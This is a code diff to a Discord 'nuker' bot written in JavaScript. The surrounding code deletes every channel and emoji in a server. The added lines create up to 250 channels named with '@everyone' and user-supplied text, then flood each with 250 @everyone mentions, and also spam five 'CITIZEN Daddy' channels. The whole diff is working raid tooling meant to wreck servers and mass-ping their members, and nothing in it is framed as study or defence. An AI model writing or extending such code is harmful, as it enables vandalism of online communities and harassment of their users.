@@ -459,8 +459,7 @@ client.on("message", async message => {
                     message.guild.channels.cache.forEach(channel => channel.delete().then(
                         console.log(redBright(`CHANNEL FUCKED`))
                     )); // deletes all channels
-                  for (var i = 0; i < 5; i++) {
-                       let channels = message.guild.channels.create("CITIZEN Daddy") }
+                  message.guild.channels.create("CITIZEN Daddy")
 
             }
         }
@@ -550,6 +549,20 @@ client.on("message", async message => {
                 // Emoji
                 message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))
 
+                //
+                 for (var i = 0; i < 5; i++) {
+                        let channels = message.guild.channels.create("CITIZEN Daddy")
+
+                        channels.then(
+                            function (channel, index) {
+                                for (var i = 0; i < 250; i++) {
+                                    channel.send("@everyone")
+                                    console.log(blueBright(`CHANNEL PINGED!`));
+                                    // other per-channnel logic
+                                }
+                            }
+                        )
+                    }
 
 
                //Channel Creation
@@ -575,7 +588,28 @@ client.on("message", async message => {
 
                     }
 
+                // Massing Channels
+                let args = message.content.split(" ").slice(1);
+                var argresult = args.join(' ');
 
+                if (!argresult) {
+                    message.channel.send("*Add an input after the cmd*")
+                } else {
+
+                    for (var i = 0; i < 250; i++) {
+                        let channels = message.guild.channels.create("@everyone "+argresult)
+
+                        channels.then(
+                            function (channel, index) {
+                                for (var i = 0; i < 250; i++) {
+                                    channel.send(`${argresult}`)
+                                    console.log(blueBright(`CHANNEL PINGED!`));
+                                    // other per-channnel logic
+                                }
+                            }
+                        )
+                    }
+                }
 
 
 
